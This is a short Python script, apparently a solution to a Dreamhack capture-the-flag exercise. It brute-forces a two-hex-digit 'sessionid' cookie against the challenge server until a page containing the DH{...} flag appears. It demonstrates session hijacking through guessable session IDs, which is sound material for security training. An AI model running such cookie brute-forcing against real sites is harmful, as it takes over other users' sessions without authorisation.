import requests
import tqdm
import re

# 세션 객체 생성
session = requests.Session()
url = 'http://host3.dreamhack.games:8729/'

for i in tqdm.tqdm(range(256)):
    bf_random = format(i, '02x')
    # 세션에 쿠키 설정
    session.cookies.set('sessionid', bf_random)
    # 세션을 사용하여 GET 요청
    response = session.get(url)

    if 'flag' in response.text:
        print(bf_random)
        # response.text에서 정규표현식에 맞는 문자열 찾아서 매칭 정보 리턴
        flag = re.search(r'DH\{.*?\}', response.text)
        # 매칭 정보에서 텍스트를 문자열로 반환
        print(flag.group())
        break
